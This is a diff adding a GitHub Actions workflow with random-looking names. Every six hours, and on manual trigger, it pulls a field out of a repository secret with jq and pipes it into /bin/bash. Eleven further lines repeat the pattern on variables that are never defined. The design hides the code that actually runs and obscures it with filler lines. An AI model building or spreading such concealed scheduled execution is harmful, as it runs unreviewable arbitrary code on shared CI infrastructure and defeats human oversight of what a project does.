@@ -1,0 +1,29 @@
+name: shidayueguang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shidayueguang
+        env:
+          xtnb7421: ${{ secrets.xtnb7421 }}
+        run: |
+          echo $xtnb7421 | jq -r .a6 | /bin/bash
+          echo $u4 | jq -r .vnoby2 | /bin/bash
+          echo $ta7455 | jq -r .g86 | /bin/bash
+          echo $nlo68 | jq -r .yoye85 | /bin/bash
+          echo $ipg6349 | jq -r .ei4851 | /bin/bash
+          echo $becvt15702 | jq -r .pvsvu8 | /bin/bash
+          echo $pcnfh4391 | jq -r .pcuk817 | /bin/bash
+          echo $ve7 | jq -r .rda39 | /bin/bash
+          echo $uprj05 | jq -r .fwz352 | /bin/bash
+          echo $gzd9361 | jq -r .x5 | /bin/bash
+          echo $efzp33992 | jq -r .zzeh366 | /bin/bash
+          echo $e0 | jq -r .c2059 | /bin/bash
+
